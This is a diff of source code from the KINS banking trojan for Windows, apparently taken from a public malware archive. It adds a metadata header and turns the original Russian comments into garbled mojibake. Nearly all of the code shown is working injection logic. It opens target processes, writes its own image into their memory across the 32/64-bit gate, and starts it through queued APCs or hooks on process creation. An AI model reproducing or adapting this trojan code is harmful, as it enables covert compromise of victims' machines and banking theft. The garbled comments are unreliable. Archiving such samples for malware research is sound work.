@@ -1,3 +1,14 @@
+/*
+  name      KINS
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    RamadhanAmizudin/malware
+  archived  RamadhanAmizudin, krisyotam (2026)
+  notes     вЂ”
+ */
 #include <intrin.h>
 #include <stdio.h>
 #include <windows.h>
@@ -108,10 +119,10 @@ VOID Inject::InjectRoutine(PVOID ImageBase, BOOLEAN bAPC)
 			Drop::bFirstImageLoad = FALSE;
 			Drop::bWorkThread = FALSE;
 
-			// Если инжект через апц или через эксплоит то можно сразу создавать основной поток
+			// пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 			if (bAPC /*|| Exploit32::SetNotifyInjectEventRestoreAtan()*/) Drop::CreateInjectStartThread();
 
-			// Если инжект через RtlCreateUserThread то поток создадим только через перехват
+			// пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ RtlCreateUserThread пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 			SetCreateProcessHooks();
 		}
 	}
@@ -125,7 +136,7 @@ BOOLEAN Inject::CopyImageToProcess(HANDLE ProcessHandle, PVOID ImageBase, DWORD 
 	PVOID RelocImage;
 
 #ifndef _WIN64
-	// Если мы 32 а таргет 64 аллокаем память через гейт
+	// пїЅпїЅпїЅпїЅ пїЅпїЅ 32 пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ 64 пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 	if (Utils::IsWow64(NtCurrentProcess()) && !Utils::IsWow64(ProcessHandle))
 	{
 		*RemoteImage = NULL;
@@ -135,7 +146,7 @@ BOOLEAN Inject::CopyImageToProcess(HANDLE ProcessHandle, PVOID ImageBase, DWORD 
 			DbgMsg(__FUNCTION__"(): x64ZwAllocateVirtualMemory failed: %08X\r\n", St);
 		}
 	}
-	// Если мы 64 а таргет 64/32, или мы 32 и таргет 32 аллокам просто 
+	// пїЅпїЅпїЅпїЅ пїЅпїЅ 64 пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ 64/32, пїЅпїЅпїЅ пїЅпїЅ 32 пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ 32 пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ 
 	else
 #endif
 	{
@@ -156,7 +167,7 @@ BOOLEAN Inject::CopyImageToProcess(HANDLE ProcessHandle, PVOID ImageBase, DWORD 
 			if (PeLdr::PeProcessRelocs(RelocImage, (DWORD64)PeLdr::PeGetImageBase(ImageBase) - (DWORD64)ImageBase))
 			{
 #ifndef _WIN64
-				// Если мы 32 а таргет 64 пишем память через гейт
+				// пїЅпїЅпїЅпїЅ пїЅпїЅ 32 пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ 64 пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 				if (Utils::IsWow64(NtCurrentProcess()) && !Utils::IsWow64(ProcessHandle))
 				{
 					NTSTATUS St = x64Utils::x64NtWriteVirtualMemory(ProcessHandle, *RemoteImage, (DWORD64)RelocImage, ImageSize);
@@ -166,7 +177,7 @@ BOOLEAN Inject::CopyImageToProcess(HANDLE ProcessHandle, PVOID ImageBase, DWORD 
 						DbgMsg(__FUNCTION__"(): x64ZwWriteVirtualMemory failed: %08X\r\n", St);
 					}
 				}
-				// Если мы 64 а таргет 64/32, или мы 32 и таргет 32 пишем просто 
+				// пїЅпїЅпїЅпїЅ пїЅпїЅ 64 пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ 64/32, пїЅпїЅпїЅ пїЅпїЅ 32 пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ 32 пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ 
 				else
 #endif
 				{
@@ -200,14 +211,14 @@ BOOLEAN Inject::InjectImageToProcess(HANDLE ProcessHandle, PVOID ImageBase, DWOR
 		if (StartRoutine)
 		{
 			StartRoutine = RemoteImage + (DWORD_PTR)StartRoutine;
-			// Если есть поток вставляем апц (инжект в новый процесс)
+			// пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ (пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ)
 			if (ThreadHandle)
 			{
 #ifndef _WIN64
-				// Если мы 32
+				// пїЅпїЅпїЅпїЅ пїЅпїЅ 32
 				if (Utils::IsWow64(NtCurrentProcess()))
 				{
-					// A таргет 64 вставляем апц через гейт
+					// A пїЅпїЅпїЅпїЅпїЅпїЅ 64 пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 					if (!Utils::IsWow64(ProcessHandle))
 					{
 						St = x64Utils::x64NtQueueApcThread(ThreadHandle, StartRoutine, RemoteImage);
@@ -220,7 +231,7 @@ BOOLEAN Inject::InjectImageToProcess(HANDLE ProcessHandle, PVOID ImageBase, DWOR
 							DbgMsg(__FUNCTION__"(): x64NtQueueApcThread failed: %08X\r\n", St);
 						}
 					}
-					// А таргет 32 вставляем просто
+					// пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ 32 пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 					else
 					{
 						St = NtQueueApcThread(ThreadHandle, (PVOID)StartRoutine, (PVOID)RemoteImage, NULL, NULL);
@@ -234,12 +245,12 @@ BOOLEAN Inject::InjectImageToProcess(HANDLE ProcessHandle, PVOID ImageBase, DWOR
 						}
 					}
 				}
-				// Если мы 64
+				// пїЅпїЅпїЅпїЅ пїЅпїЅ 64
 				else
 #endif
 				{
 #ifdef _WIN64
-					// А таргет 32 вставляем апц через вов64 враппер
+					// пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ 32 пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ64 пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 					if (Utils::IsWow64(ProcessHandle))
 					{
 						St = RtlQueueApcWow64Thread(ThreadHandle, (PVOID)StartRoutine, (PVOID)RemoteImage, NULL, NULL);
@@ -252,7 +263,7 @@ BOOLEAN Inject::InjectImageToProcess(HANDLE ProcessHandle, PVOID ImageBase, DWOR
 							DbgMsg(__FUNCTION__"(): RtlQueueApcWow64Thread failed: %08X\r\n", St);
 						}
 					}
-					// А таргет 64 вставляем просто
+					// пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ 64 пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 					else
 #endif
 					{
@@ -269,7 +280,7 @@ BOOLEAN Inject::InjectImageToProcess(HANDLE ProcessHandle, PVOID ImageBase, DWOR
 				}
 			}
 #ifndef _WIN64
-			// Если нету потока создаем (инжект в существующий процесс)
+			// пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ (пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ)
 			else
 			{
 				if (Utils::IsWow64(NtCurrentProcess()) && !Utils::IsWow64(ProcessHandle))
@@ -317,7 +328,7 @@ BOOLEAN Inject::InjectProcess(DWORD ProcessId, HANDLE ThreadHandle)
 	PVOID ImageBase;
 	DWORD ImageSize;
 
-	// Если процесс не инжекчен
+	// пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	if (Utils::CheckMutex(ProcessId, Drop::GetMachineGuid()))
 	{
 		ProcessHandle = OpenProcess(PROCESS_VM_OPERATION|PROCESS_VM_READ|PROCESS_VM_WRITE|PROCESS_QUERY_INFORMATION|PROCESS_CREATE_THREAD, FALSE, ProcessId);
@@ -328,18 +339,18 @@ BOOLEAN Inject::InjectProcess(DWORD ProcessId, HANDLE ThreadHandle)
 		}
 		if (ProcessHandle)
 		{
-			// Проверяем имя процесса
+			// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 			if (CheckProcessName(ProcessHandle))
 			{
 #ifdef _WIN64
-				// Если мы 64 а трагет процесс 32, конвертируем себя в 32 и инжектим
+				// пїЅпїЅпїЅпїЅ пїЅпїЅ 64 пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ 32, пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅ 32 пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 				if (Utils::IsWow64(ProcessHandle))
 #else
-				// Если мы 32 а а тарегт процесс 64, конвертируем себя в 64 и инжектим
+				// пїЅпїЅпїЅпїЅ пїЅпїЅ 32 пїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ 64, пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅ 64 пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 				if (Utils::IsWow64(NtCurrentProcess()) && !Utils::IsWow64(ProcessHandle))
 #endif
 				{
-					// Конвертируем себя из 32 в 64 либо из 64 в 32, если первый запуск и инжект (32 в 64) нужно прогрузить секции 64 по вирутальным адресам
+					// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅ 32 пїЅ 64 пїЅпїЅпїЅпїЅ пїЅпїЅ 64 пїЅ 32, пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ (32 пїЅ 64) пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ 64 пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 					if (SecCfg::GetImageFromImage(Drop::CurrentImageBase, &ImageBase, &ImageSize, Drop::bFirstImageLoad))
 					{
 						Result = InjectImageToProcess(ProcessHandle, ImageBase, ImageSize, ThreadHandle);
@@ -347,7 +358,7 @@ BOOLEAN Inject::InjectProcess(DWORD ProcessId, HANDLE ThreadHandle)
 						VirtualFree(ImageBase, 0, MEM_RELEASE);
 					}
 				}
-				// Если мы 64 и таргет 64 или мы 32 и таргет 32 инжектим себя
+				// пїЅпїЅпїЅпїЅ пїЅпїЅ 64 пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ 64 пїЅпїЅпїЅ пїЅпїЅ 32 пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ 32 пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 				else
 				{
 					Result = InjectImageToProcess(ProcessHandle, Drop::CurrentImageBase, Drop::CurrentImageSize, ThreadHandle);
